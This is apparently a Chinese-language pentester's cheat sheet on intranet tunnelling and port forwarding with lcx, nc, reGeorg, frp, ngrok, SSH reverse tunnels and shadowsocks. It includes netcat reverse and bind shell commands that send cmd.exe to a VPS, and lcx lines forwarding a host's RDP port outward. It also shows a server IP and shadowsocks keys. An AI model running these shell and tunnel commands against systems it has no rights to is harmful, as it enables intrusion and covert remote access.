### 工具

+ lcx.exe

    ```shell
    # 内网端口转发
    lcx.exe -slave vps 2333 127.0.0.1 3389  # 把主机 3389 端口转发到 vps 2333 端口
    lcx.exe -listen 2333 4444  # 监听 2333 端口，并将 2333 请求转发给 4444 端口
    
    # 本地端口转发
    lcx.exe -tran 21 ip 3389  # 将 3389 端口转发到 21 端口
    ```

+ earthworm

    升级版：termite

+ s5.py

    配合 Proxifier 一起使用

+ nc

    ```shell
    # 反向连接
    nc -lvvvp 2333  # vps 开启监听
    nc -t -e cmd.exe vps 2333  # -t 通过 Telnet 模式执行 cmd.exe
    
    # 正向代理
    nc -lp 2333 -t -e cmd.exe  # vps
    nc -vv vps 2333  # 本地
    ```

    

+ reGeorg

    通过 `webshell` 建立一个 `socks` 代理进行内网穿透

+ frp

    frp 牛逼，直接看[文档](https://github.com/fatedier/frp/blob/master/README_zh.md) 

    将 **frps** 及 **frps.ini** 放到具有公网 IP 的机器上。

    将 **frpc** 及 **frpc.ini** 放到处于内网环境的机器上。

    **通过 ssh 访问公司内网机器**

    1. 修改 frps.ini 文件，这里使用了最简化的配置：

    ```shell
    # frps.ini
    [common]
    bind_port = 7000
    
    ./frps -c ./frps.ini
    ```

    ​    2.修改 frpc.ini 文件，假设 frps 所在服务器的公网 IP 为 x.x.x.x；

    ```shell
    # frpc.ini
    [common]
    server_addr = x.x.x.x
    server_port = 7000
    
    [ssh]
    type = tcp
    local_ip = 127.0.0.1
    local_port = 22
    remote_port = 6000
    
    ./frpc -c ./frpc.ini
    ```

    通过 ssh 访问内网机器，假设用户名为 test

    ```
    ssh -oPort=6000 test@x.x.x.x
    ```

    **通过自定义域名访问部署于内网的 web 服务**

    有时想要让其他人通过域名访问或者测试我们在本地搭建的 web 服务，但是由于本地机器没有公网 IP，无法将域名解析到本地的机器，通过 frp 就可以实现这一功能，以下示例为 http 服务，https 服务配置方法相同， vhost_http_port 替换为 vhost_https_port， type 设置为 https 即可。

    1. 修改 frps.ini 文件，设置 http 访问端口为 8080：

    ```shell
    # frps.ini
    [common]
    bind_port = 7000
    vhost_http_port = 8080
    
    ./frps -c ./frps.ini
    ```

    ​    2.修改 frpc.ini 文件，假设 frps 所在的服务器的 IP 为 x.x.x.x，local_port 为本地机器上 web 服务对应      的端口, 绑定自定义域名 `www.yourdomain.com`:

    ```
    # frpc.ini
    [common]
    server_addr = x.x.x.x
    server_port = 7000
    
    [web]
    type = http
    local_port = 80
    custom_domains = www.yourdomain.com
    
    ./frpc -c ./frpc.ini
    ```

    1. 将 `www.yourdomain.com` 的域名 A 记录解析到 IP `x.x.x.x`，如果服务器已经有对应的域名，也可以将 CNAME 记录解析到服务器原先的域名。
    2. 通过浏览器访问 `http://www.yourdomain.com:8080` 即可访问到处于内网机器上的 web 服务。

+ ngrok

### 服务器端:（只用ssh映射，不用跑shadowsocks）

```shell
ssh -R 0.0.0.0:2333:localhost:2333 root@120.79.1.209

vi /etc/ssh/sshd_config
添加一行 //添加GatewayPorts yes  # 使服务器的ssh允许转发0.0.0.0

netstat -an | grep 2333  # 查看端口转发情况
ufw allow 2333    # 防火墙打开端口，记得打开阿里云官网的防火墙端口
service sshd restart
```

### 内网端（跑shadowsocks）
```shell
ssserver -p 2333 -k login_233 -m aes-256-cfb  # 跑shadowsocks
ssh -R 0.0.0.0:2333:localhost:2333 root@120.79.1.209  # ssh设置

```
### 访问
```shell
sslocal -s 35.201.152.114 -p 2333 -k 123456 -m aes-256-cfb -l 1082
//第三方进行
//测试端口
```

## 小问题

出现 问题 ssserver 无法打开
原因：本文适用于解决openssl升级到1.1.0以上版本，导致shadowsocks2.8.2启动报undefined symbol: EVP_CIPHER_CTX_cleanup错误。
解决https://blog.csdn.net/vbaspdelphi/article/details/72993626